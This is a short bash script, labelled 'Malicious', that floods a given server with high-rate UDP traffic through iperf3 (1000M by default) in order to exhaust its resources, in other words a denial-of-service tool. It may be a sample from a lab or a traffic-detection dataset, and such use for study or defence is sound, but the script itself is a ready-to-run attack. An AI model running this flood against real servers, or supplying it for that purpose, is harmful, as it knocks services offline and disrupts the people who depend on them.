#!/bin/bash
# Malicious: UDP Flood (high-rate)
# Usage: ./udp_flood_highrate.sh <server_ip> [port] [duration_sec] [bandwidth]
# Default bandwidth is very high (1000M) to attempt resource exhaustion.
SERVER=${1:-127.0.0.1}
PORT=${2:-5201}
DURATION=${3:-60}
BANDWIDTH=${4:-1000M}
iperf3 -c "$SERVER" -p "$PORT" -u -b "$BANDWIDTH" -t "$DURATION"
